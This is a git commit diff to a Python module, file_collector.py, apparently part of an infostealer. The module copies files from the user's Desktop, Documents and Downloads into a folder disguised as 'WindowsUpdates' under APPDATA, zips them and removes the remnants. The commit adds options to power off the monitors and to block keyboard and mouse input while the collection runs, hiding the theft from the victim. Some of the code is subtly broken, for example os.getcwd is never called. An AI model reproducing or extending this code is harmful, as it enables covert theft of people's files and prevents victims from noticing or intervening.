52e52fdfc28aa157b98b7f91c56ed6cab5613d0c
richa-z <145004550+richa-z@users.noreply.github.com>
2024-01-12 07:38:42 +0000

    added config to file_collector [Now supports monitor controlling and input blocking while working] base values => false.

--- modules/file_collector.py
+++ modules/file_collector.py
@@ -1,6 +1,10 @@
 from shutil import copy
 from shutil import make_archive
 import os
+import json
+
+import monitorcontrol
+import pynput
 
 target_path_txt = rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\txt"
 target_path_images = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\images"
@@ -13,7 +17,26 @@ docx = []
 pdf = []
 csv = []
 
+if os.path.exists(os.getcwd + __name__ + "_config.json") == True:
+    with open(os.getcwd + __name__ + "_config.json", "r") as f:
+        config = json.load(f)
+
+if config.get("input_blocking") == True:
+    kb_listener = pynput.keyboard.Listener(suppress=True)
+    m_listener = pynput.mouse.Listener(suppress=True)
+
 def main():
+    if config.get("monitor_control") == True:
+        for monitor in monitorcontrol.get_monitors():
+            try:
+                with monitor:
+                    monitor.set_power_mode(4)
+            except Exception as e:
+                print(e)
+    if config.get("input_blocking") == True:
+        kb_listener.start()
+        m_listener.start()
+
     desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
     documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
     downloads = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads')
@@ -61,6 +84,20 @@ def remove_remnants():
             os.remove(os.path.join(root, file))
 
 
+
+
 main()
 make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files")
 remove_remnants()
+
+if config.get("monitor_control") == True:
+        for monitor in monitorcontrol.get_monitors():
+            try:
+                with monitor:
+                    monitor.set_power_mode(1)
+            except Exception as e:
+                print(e)
+
+if config.get("input_blocking") == True:
+    kb_listener.stop()
+    m_listener.stop()
